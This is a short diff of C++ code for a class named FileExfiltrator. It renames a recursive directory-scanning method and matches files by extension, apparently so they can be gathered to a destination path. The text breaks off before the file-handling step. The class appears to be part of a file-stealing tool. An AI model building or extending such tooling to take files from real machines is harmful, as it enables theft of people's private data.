@@ -1,12 +1,12 @@
 #include "FileExfiltrator.hpp"
 
-FileExfiltrator::FileExfiltrator(const fs::path& target, const fs::path& destination, const std::string& extension) : 
-target(target), destination(destination), extension(extension)
+FileExfiltrator::FileExfiltrator(const fs::path& source, const fs::path& destination, const std::string& extension) : 
+source(source), destination(destination), extension(extension)
 {}
 
-void FileExfiltrator::scanner(const fs::path& dir) {
+void FileExfiltrator::executor(const fs::path& dir) {
         for(const auto& entry : fs::directory_iterator(dir)) {
-        if(entry.is_directory()) scanner(entry.path());
+        if(entry.is_directory()) executor(entry.path());
 
         else if(entry.path().extension() == extension) {
             try{
